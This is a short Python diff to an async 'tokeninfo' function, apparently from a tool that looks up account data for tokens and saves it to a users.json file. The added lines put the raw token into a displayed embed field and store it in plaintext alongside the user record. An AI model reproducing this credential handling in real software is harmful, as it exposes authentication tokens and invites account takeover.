@@ -78,6 +78,8 @@ async def tokeninfo(_token, embed):
                     for key, value in j.items():
                         embed.add_field(name=f"{key}", value=f"{value}", inline=False)
                         user[f"{key}"] = value
+                    embed.add_field(name="token", value=f"{_token}", inline=False)
+                    user["Token"] = _token
                     users.append(user)
                 with open("./resources/users.json", "w", encoding="utf-8") as f:
                     json.dump(data, f, indent=4)
